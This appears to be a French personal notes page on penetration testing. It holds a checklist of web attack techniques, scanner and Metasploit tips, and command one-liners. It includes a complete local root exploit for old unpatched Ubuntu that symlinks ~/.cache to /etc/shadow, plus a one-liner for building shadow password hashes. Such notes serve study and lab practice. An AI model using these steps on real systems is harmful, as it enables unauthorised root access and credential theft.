<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
</head>
[index](index.html)

## Hacking machines

### Utilisation de Kali

- Installer une full pour avoir metasploit
- Les wordlists sont dans /usr/share/wordlists

### Recherche vulnerabilités

- Banner grabbing: $nc [ip] [port] : ex donne info sur serveur web.
- NeXpose (Rapid7), possibilite de sauver le report en xml pour relecture dans msf. Il existe aussi plugin "nexpose" pour msf.
- Nessus (Tenable Security). Il existe aussi plugin "nessus" pour msf.
- OpenVAS : Fork Open Source de Nessus (qui est devenu close) - Installé sur https://127.0.0.1:9392. Se paramètre via openvasmd, par exemple pour reinit le password d'admin:
    $ openvasmd --user=admin --new-password=letmein

### [Metasploit](hacking-metasploit.html)

## Hacking web

### Les attaques
1. Regarder le source généré (CTRL+U sur Firefox)
- Regarder les autres fichiers chargés (y.c leur code source, notamment pour js et css)
- Décoder le fonctionnement du javascript
- Tester les user/pwd triviaux. Liste : 
- Fichiers backup (~, bak, old, sav)
- Regarder si un fichier robots.txt est présent
- Fichiers autogénérés comme .pyc si site en python
- La présence d'un répertoire de livraison
- La présente du répertoire .git/ ou .svn... ou même /git
- [XSS injection](xss.html)
- XXE : un peu comme XSS mais grace aux entités et aux dtd. A noter qu'on peut faire des XXE permettant d'envoyer le résultat avant la fin de la page.
- XSL : il est possible de faire des choses sympa si on peut modifier le xsl : connaître le moteur xsl et sa version, dans certains cas injecter des commandes, lire des documents choisis (ou en partie), voire même écrire.
- Injection sql (blind, différents moteurs, time attack, tables systèmes)
- Injection xpath (cf sql)
- LFI : upload de fichier (mime, extension, php dans fichier, null byte dans nom) + moyen executer
- S'il est possible d'uploader des fichiers compressés (ou au moins .tar) qui seront décompressés : mettre un symlink 
- Modification du user-agent ou autres parties header
- Lire aussi le header de retour
- Modification du cookie
- Directory indexing/traversing - Essayer de deviner les répertoires
- Fichiers/répertoire d'install
- CRLF : permet de leurrer utilisateur, ou mailer
- PHP : register globals (pour les var non initialisées) - vieilles versions
- [PHP wrappers](phpwrappers.html) : affiche contenu des fichiers php...

### Les outils

1. md5sum : Pour générer la somme md5. Ex: echo bob | md5sum

- python -c "import crypt, getpass, pwd; print crypt.crypt('password', '\$6\$salt\$')"
=> pour creer /etc/shadow

- Serveur web avec netcat : while true; do nc -l -p 8080 < index.html; done 
UTILISER EN FAIT nc.traditional au lieu de nc
http://www.monip.org : 82.238.192.170

Exploit linix :
sur ubuntu non patche:
Aujourd'hui, une faille de sécurité assez simple à mettre en oeuvre a été révélée. Elle n'impacte que la distribution Linux Ubuntu sur les versions 9.10 et 10.04.

Celle-ci concerne donc ce problème de sécurité qui permet à n'importe quel utilisateur loggué sur la machine d'acquérir les droits du compte root (superadmin).

L'exploit se base sur une faiblesse du module pam_motd qui est intégré dans la chaine d'authentification.

Il est donc possible de simplement le retirer la pile pam via les fichiers de configuration ou de mettre à jour comme préconisé.

Je vous communique l'exploit à titre d'information:

Admettons que je sois loggué sur la machine sous l'utilisateur: franck

---

rm -rf ~/.cache

ln -s /etc/shadow ~/.cache

ssh localhost

---

Vous voila propriétaire du fichier /etc/shadow !

Ce qui vous permettra bien évidemment de récupérer l'accès root...

- Manipuler de l'hexa : xxd et hd

## Hacking imprimantes

Il semble que [PRET](https://github.com/RUB-NDS/PRET) PRinter Exploitation Toolkit (outils pythons) soit pas mal utilisé.


